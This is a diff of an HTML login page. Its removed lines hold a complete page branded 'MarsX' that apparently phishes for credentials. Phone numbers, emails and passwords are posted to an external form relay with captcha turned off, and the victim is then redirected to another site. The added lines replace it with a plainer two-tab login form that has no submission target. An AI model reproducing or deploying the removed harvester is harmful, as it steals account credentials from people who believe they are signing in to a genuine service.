@@ -1,41 +1,27 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login | MarsX</title>
+  <title>Phone Login Page</title>
   <style>
     body {
       background-color: #000;
       font-family: Arial, sans-serif;
       color: white;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
       margin: 0;
     }
 
     .container {
-      text-align: center;
-      width: 100%;
-      max-width: 400px;
-      padding: 30px 20px;
-    }
-
-    .logo {
-      margin-bottom: 10px;
-    }
-
-    .logo img {
-      height: 60px;
-    }
-
-    h2 {
-      font-size: 26px;
-      font-weight: bold;
-      margin-bottom: 20px;
+      background-color: #111;
+      padding: 30px;
+      border-radius: 20px;
+      width: 300px;
+      box-shadow: 0 0 20px rgba(255, 215, 0, 0.1);
     }
 
     .tabs {
@@ -57,6 +43,7 @@
       background-color: transparent;
       color: white;
       transition: background-color 0.3s;
+      text-align: center;
     }
 
     .tab.active {
@@ -64,237 +51,118 @@
       color: black;
     }
 
-    form {
+    .form {
       display: flex;
       flex-direction: column;
-      align-items: stretch;
+      gap: 15px;
     }
 
-    .phone-input {
-      display: flex;
-      align-items: center;
+    .phone-input select {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
       background-color: #222;
-      border-radius: 10px;
-      padding: 0 10px;
-      margin-bottom: 20px;
-    }
-
-    .phone-input img {
-      width: 20px;
-      margin-right: 8px;
-    }
-
-    .phone-input select,
-    .phone-input input {
-      background: transparent;
       border: none;
       color: white;
-      padding: 12px 5px;
-      font-size: 16px;
-      flex: 1;
-      outline: none;
-    }
-
-    .input-wrapper {
-      position: relative;
-      margin-bottom: 20px;
+      border-radius: 10px;
+      appearance: none;
+      text-align: left;
     }
 
     .input-wrapper input {
       width: 100%;
       padding: 12px;
-      border-radius: 10px;
-      border: none;
-      outline: none;
+      font-size: 16px;
       background-color: #222;
-      color: white;
-      font-size: 16px;
-    }
-
-    .input-wrapper .toggle-password {
-      position: absolute;
-      right: 15px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      color: #999;
-    }
-
-    .options {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 14px;
-      color: #ccc;
-      margin-bottom: 20px;
-    }
-
-    .options a {
-      color: #d4af37;
-      text-decoration: none;
-    }
-
-    .remember-me {
-      display: flex;
-      align-items: center;
-    }
-
-    .remember-me input {
-      margin-right: 5px;
-    }
-
-    button {
-      background-color: #d4af37;
       border: none;
-      padding: 12px;
+      color: white;
+      border-radius: 10px;
+    }
+
+    .submit-btn {
+      background-color: #d4af37;
       color: black;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
       font-weight: bold;
-      font-size: 16px;
-      border-radius: 25px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
-      width: 100%;
+      font-size: 16px;
     }
 
-    button:hover {
-      background-color: #b3922b;
+    .submit-btn:hover {
+      background-color: #e6c64d;
     }
 
-    #please-wait {
-      display: none;
-      color: #d4af37;
-      font-size: 14px;
-      margin-top: 10px;
+    label {
+      font-size: 12px;
+      text-align: left;
+      margin-bottom: -10px;
     }
-
-    .signup {
-      font-size: 14px;
-      color: #aaa;
-      margin-top: 20px;
-    }
-
-    .signup a {
-      color: #d4af37;
-      text-decoration: none;
-      font-weight: bold;
-    }
-
-    .form-section {
-      display: none;
-    }
-
-    .form-section.active {
-      display: block;
-    }
-
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="logo">
-      <img src="https://i.imgur.com/KZsmUi2.png" alt="MarsX Logo" />
-    </div>
-
-    <h2>Welcome To Login</h2>
-
     <div class="tabs">
-      <div class="tab active" onclick="switchTab('phone')">Phone Login</div>
-      <div class="tab" onclick="switchTab('email')">Email Login</div>
+      <div class="tab active" id="phoneTab" onclick="showPhoneLogin()">Phone Login</div>
+      <div class="tab" id="emailTab" onclick="showEmailLogin()">Email Login</div>
     </div>
 
-    <!-- PHONE LOGIN FORM -->
-    <form class="form-section active" id="phone-form" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
-      <input type="hidden" name="_captcha" value="false">
-
-      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Phone Number</label>
+    <form class="form" id="phoneLoginForm">
+      <label>Phone Number</label>
       <div class="phone-input">
-        <img src="https://flagcdn.com/us.svg" alt="US Flag">
-        <select name="country_code" style="width: 50px;">
-          <option value="+1">+1</option>
+        <select id="country-select" name="country" onchange="updateDialCode()" required>
+          <option value="+1">🇺🇸 +1</option>
+          <option value="+1">🇨🇦 +1</option>
+          <option value="+33">🇫🇷 +33</option>
+          <option value="+47">🇳🇴 +47</option>
+          <option value="+34">🇪🇸 +34</option>
+          <option value="+46">🇸🇪 +46</option>
+          <option value="+41">🇨🇭 +41</option>
+          <option value="+63">🇵🇭 +63</option>
+          <option value="+44">🇬🇧 +44</option>
+          <option value="+57">🇨🇴 +57</option>
         </select>
-        <input type="text" name="phone_number" placeholder="Phone Number" required />
       </div>
-
-      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Password</label>
       <div class="input-wrapper">
-        <input type="password" id="phone-password" name="password" placeholder="Password" required />
-        <span class="toggle-password" onclick="togglePassword('phone-password')">👁️</span>
+        <input type="tel" name="phone_number" placeholder="Phone Number" required />
       </div>
-
-      <div class="options">
-        <a href="#">Forgot password?</a>
-        <label class="remember-me">
-          <input type="checkbox" name="remember" />
-          Remember account and password
-        </label>
-      </div>
-
-      <button type="submit">Log In</button>
-      <div id="please-wait">Please wait...</div>
+      <button class="submit-btn" type="submit">Login</button>
     </form>
 
-    <!-- EMAIL LOGIN FORM -->
-    <form class="form-section" id="email-form" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
-      <input type="hidden" name="_captcha" value="false">
-
-      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Email</label>
+    <form class="form" id="emailLoginForm" style="display: none;">
+      <label>Email Address</label>
       <div class="input-wrapper">
-        <input type="email" name="email" placeholder="Email" required />
+        <input type="email" name="email" placeholder="you@example.com" required />
       </div>
-
-      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Password</label>
+      <label>Password</label>
       <div class="input-wrapper">
-        <input type="password" id="email-password" name="password" placeholder="Password" required />
-        <span class="toggle-password" onclick="togglePassword('email-password')">👁️</span>
+        <input type="password" name="password" placeholder="Password" required />
       </div>
-
-      <div class="options">
-        <a href="#">Forgot password?</a>
-        <label class="remember-me">
-          <input type="checkbox" name="remember" />
-          Remember account and password
-        </label>
-      </div>
-
-      <button type="submit">Log In</button>
-      <div id="please-wait">Please wait...</div>
+      <button class="submit-btn" type="submit">Login</button>
     </form>
-
-    <div class="signup">
-      Continue Is Agree <a href="#">Sign Up</a>
-    </div>
   </div>
 
   <script>
-    function handleSubmit() {
-      document.getElementById("please-wait").style.display = "block";
-      setTimeout(() => {
-        window.location.href = "https://masx45.com/";
-      }, 1000);
-      return true;
+    function showPhoneLogin() {
+      document.getElementById("phoneLoginForm").style.display = "flex";
+      document.getElementById("emailLoginForm").style.display = "none";
+      document.getElementById("phoneTab").classList.add("active");
+      document.getElementById("emailTab").classList.remove("active");
     }
 
-    function togglePassword(id) {
-      const pwd = document.getElementById(id);
-      pwd.type = pwd.type === "password" ? "text" : "password";
+    function showEmailLogin() {
+      document.getElementById("phoneLoginForm").style.display = "none";
+      document.getElementById("emailLoginForm").style.display = "flex";
+      document.getElementById("phoneTab").classList.remove("active");
+      document.getElementById("emailTab").classList.add("active");
     }
 
-    function switchTab(tab) {
-      const phoneForm = document.getElementById("phone-form");
-      const emailForm = document.getElementById("email-form");
-      const tabs = document.querySelectorAll(".tab");
-
-      if (tab === "phone") {
-        phoneForm.classList.add("active");
-        emailForm.classList.remove("active");
-        tabs[0].classList.add("active");
-        tabs[1].classList.remove("active");
-      } else {
-        emailForm.classList.add("active");
-        phoneForm.classList.remove("active");
-        tabs[1].classList.add("active");
-        tabs[0].classList.remove("active");
-      }
+    function updateDialCode() {
+      const select = document.getElementById("country-select");
+      const dialCode = select.value;
+      console.log("Selected Dial Code:", dialCode);
+      // Tu peux utiliser cette valeur si tu veux la pré-remplir quelque part
     }
   </script>
 </body>
